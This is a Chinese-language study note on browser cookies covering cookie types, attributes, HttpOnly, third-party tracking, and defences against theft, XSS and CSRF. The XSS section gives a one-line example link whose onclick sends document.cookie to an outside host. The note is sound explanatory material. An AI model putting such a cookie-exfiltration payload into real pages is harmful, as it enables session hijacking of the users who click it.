---
date: 2023-01-10
title: 对 cookie 的了解
tags:
  - 浏览器
---

- HTTP 连接是无状态的，所以网络请求需要一个标志来识别用户身份，cookie 就扮演这个角色。

- 客户端会记录服务器返回来的 Set-Cookie 首部中的 cookie 内容，存储在浏览器中，下次请求时，在 cooike 请求首部发出去

- cookie 类型：

    - 会话 cookie：在退出浏览器就被删除

    - 持久 cookie： 存储在硬盘里，维护一个配置文件或者登录信息。会设置一个特定的过期时间（Expires）或者有效期（Max-Age）

- cookie 的属性：

    - cookie 的域：产生 cookie 的服务器可以向 Set-Cookie 响应首部添加一个 Domain 属性来控制哪些站点可以看到该 cookie

    - cookie 的路径：Path 属性可以为服务器特定文档指定 cookie，带有这个前缀的 url 路径 才能有效

    - secure：设置了该属性，cookie 只有在 https 协议情况下才会发送给服务端

- 操作 cookie：

    - document.cookie 设置和获取

    - document.cookie 无法访问带有 HttpOnly 标记的 cookie，为了防止 XSS 攻击

- 第三方 cookie：

    - cookie 的域和浏览器地址的域匹配，被称为第一方 cookie，否则称为第三方

    - 一般被用在第三方广告网站，为了跟踪用户的浏览记录，收集用户浏览习惯，推送广告

- 安全：

    - 攻击者窃取用户的 cookie 冒充用户请求，拦截 cookie 执行恶意任务

        - 解决：服务器可以设置 secure 属性的 cookie，这样就只能通过 https 的方式来发送 cookies 了

    - 跨站脚本攻击 XSS：当网站允许使用 hs 操作 cookie 的时候，攻击者可以发布恶意代码攻击用户的会话，窃取 cookie 信息

        - 例如：<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包

        - 解决：可以通过 cookie 的 HttpOnly 属性，js 代码将不能操作 cookie。

    - 跨站请求伪造 CSRF：冒充用户发起请求，完成一些违背用户意愿的事情

        - 验证码；强制用户必须与应用进行交互，才能完成最终请求；

        - 尽量使用 post ，限制 get 使用；get 太容易被拿来做 csrf 攻击；

        - token 验证 CSRF 防御机制是公认最合适的方案